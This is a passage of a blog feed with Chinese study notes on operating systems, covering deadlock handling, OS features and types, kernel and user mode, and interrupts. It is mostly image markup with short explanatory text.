srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627145436034" style="zoom:67%;"><h6 id="1-预防死锁"><a href="#1-预防死锁" class="headerlink" title="1.预防死锁"></a>1.预防死锁</h6><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627152510647.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627152510647.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627152510647"></p><h6 id="2-避免死锁"><a href="#2-避免死锁" class="headerlink" title="2.避免死锁"></a>2.避免死锁</h6><p>安全序列，指的是系统按照这种序列分配资源，则每个进程都能顺利完成，只要找出一个安全序列，系统就是安全状态，当然，安全序列可能有多个</p><p>在资源分配之前预先判断这次分配是否会导致系统进入不安全状态，一次决定是否答应资源分配请求，银行家算法的核心思想</p><p>在进程提出资源申请时，先预判此次分配是否会导致系统进入不安全状态，如果会进入不安全状态，就暂时不答应此次请求，让该进程先阻塞等待</p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160556548.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160556548.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627160556548"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160617924.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160617924.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627160617924"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160646091.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160646091.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627160646091"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160722784.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627160722784.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627160722784"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161010022.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161010022.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627161010022" style="zoom:67%;"><h6 id="3-死锁的检测和解除"><a href="#3-死锁的检测和解除" class="headerlink" title="3.死锁的检测和解除"></a>3.死锁的检测和解除</h6><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161450883.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161450883.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627161450883"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161616111.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161616111.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627161616111"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161649915.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627161649915.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627161649915"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162405381.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162405381.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627162405381" style="zoom:67%;"><p>解除</p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162451559.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162451559.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627162451559"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162543728.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162543728.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627162543728" style="zoom:67%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162600990.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627162600990.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627162600990" style="zoom:50%;">]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统复习-1</title>
      <link href="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/"/>
      <url>/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h1><p>并发、共享、虚拟、异步</p><p><strong>并发和共享是最基本的特征</strong>，两者互为存在条件</p><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>并发指的是两个或多个事件在同一时间<strong>间隔发生</strong>，这些事件宏观上是同时发生的，但微观上是交替发生</p><p>并行指的是两个或多个事件在同一时刻<strong>同时发生</strong></p><p>操作系统的并发性指的是计算机系统中”同时“运行多个程序，这些程序宏观上看是同时运行，而微观上看是交替运行的。操作系统就是伴随着”多道程序技术“出现的，操作系统和程序并发是一起诞生的</p><p>单核CPU同一个时刻只能执行一个程序，各个程序只能<strong>并发</strong>地执行</p><p>多核CPU用一时刻能执行多个程序，多个程序可以<strong>并行</strong>地执行</p><h2 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h2><p>共享即资源共享，是指系统中的资源可供内存中多个<strong>并发执行的进程</strong>共同使用</p><ul><li>互斥共享方式 一个时间段一个</li><li>同时共享方式（分时共享）一个时间段多个（交替）</li></ul><h2 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h2><p>虚拟指的是一个物理上的实体变成若干个逻辑上的对应物。</p><ul><li><p>空分复用技术（虚拟存储器技术）</p></li><li><p>时分复用技术（虚拟处理器）</p><p>如果失去了并发性，则一个时间段内系统中只允许一道程序，那么就失去了实现虚拟性的意义，没有<strong>并发性就谈不上虚拟性</strong></p></li></ul><h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620130338286.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620130338286.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620130338286"></p><p><strong>只有系统拥有并发性才可能导致异步性</strong></p><h1 id="操作系统的发展与分类"><a href="#操作系统的发展与分类" class="headerlink" title="操作系统的发展与分类"></a>操作系统的发展与分类</h1><h2 id="手工操作阶段"><a href="#手工操作阶段" class="headerlink" title="手工操作阶段"></a>手工操作阶段</h2><h2 id="单道批处理系统"><a href="#单道批处理系统" class="headerlink" title="单道批处理系统"></a>单道批处理系统</h2><p>引入脱机输入、输出方式，由监督程序负责控制作业的输入、输出</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620131831534.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620131831534.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620131831534" style="zoom:50%;"><h2 id="多道批处理系统"><a href="#多道批处理系统" class="headerlink" title="多道批处理系统"></a>多道批处理系统</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620132033515.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620132033515.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620132033515"></p><h2 id="分时操作系统"><a href="#分时操作系统" class="headerlink" title="分时操作系统"></a>分时操作系统</h2><p>计算机以<strong>时间片</strong>为单位轮流给各个用户/作业服务，各个用户可通过终端与计算机交互</p><p>主要优点：用户的请求可以即时响应，<strong>解决了人机交互问题</strong>，允许各个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感觉不到别人的存在。</p><p>主要缺点：不能优先处理一些紧急任务，操作系统对各个用户、作业都是完全公平，循环地为每个用户、作业服务一个时间片，不缺分任务的紧急性。</p><h2 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620132629905.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620132629905.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620132629905" style="zoom:67%;"><h2 id="其他操作系统"><a href="#其他操作系统" class="headerlink" title="其他操作系统"></a>其他操作系统</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620132656549.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620132656549.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620132656549" style="zoom:67%;"><h1 id="操作系统运行机制"><a href="#操作系统运行机制" class="headerlink" title="操作系统运行机制"></a>操作系统运行机制</h1><h2 id="两种指令"><a href="#两种指令" class="headerlink" title="两种指令"></a>两种指令</h2><h6 id="1-特权指令"><a href="#1-特权指令" class="headerlink" title="1.特权指令"></a>1.特权指令</h6><h6 id="2-非特权指令"><a href="#2-非特权指令" class="headerlink" title="2.非特权指令"></a>2.非特权指令</h6><h2 id="两种处理器状态"><a href="#两种处理器状态" class="headerlink" title="两种处理器状态"></a>两种处理器状态</h2><h6 id="1-核心态、核心态、管态"><a href="#1-核心态、核心态、管态" class="headerlink" title="1.核心态、核心态、管态"></a>1.核心态、核心态、管态</h6><p>内核态说明此时运行的是内核程序，可以执行特权指令</p><h6 id="2-用户态、目态"><a href="#2-用户态、目态" class="headerlink" title="2.用户态、目态"></a>2.用户态、目态</h6><p>用户态说明此时运行的是应用程序，只能执行非特权指令</p><p>CPU中有一个寄存器叫<strong>程序状态字寄存器PSW</strong>，其中有一个二进制位，1表示内核态，0表示用户态</p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620143446400.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620143446400.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620143446400"></p><h2 id="两种程序"><a href="#两种程序" class="headerlink" title="两种程序"></a>两种程序</h2><h6 id="1-内核程序"><a href="#1-内核程序" class="headerlink" title="1.内核程序"></a>1.内核程序</h6><h6 id="2-应用程序"><a href="#2-应用程序" class="headerlink" title="2.应用程序"></a>2.应用程序</h6><h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><p>内核是操作系统最重要核心的部分，由很多内核程序组成操作系统内核</p><h1 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h1><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620143814998.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620143814998.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620143814998" style="zoom: 50%;"><h2 id="中断类型"><a href="#中断类型" class="headerlink" title="中断类型"></a>中断类型</h2><h6 id="1-内中断"><a href="#1-内中断" class="headerlink" title="1.内中断"></a>1.内中断</h6><p>与当前执行的指令有关，中断信号来源于CPU内部</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144050028.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144050028.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620144050028" style="zoom:67%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144123561.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144123561.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620144123561"></p><h6 id="2-外中断"><a href="#2-外中断" class="headerlink" title="2.外中断"></a>2.外中断</h6><p>与当前执行的指令无关，中断信号来源于CPU外部</p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144334735.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144334735.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620144334735"></p><h2 id="中断分类"><a href="#中断分类" class="headerlink" title="中断分类"></a>中断分类</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144557774.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144557774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620144557774"></p><h2 id="中断机制的基本原理"><a href="#中断机制的基本原理" class="headerlink" title="中断机制的基本原理"></a>中断机制的基本原理</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144637546.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144637546.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620144637546"></p><p><img 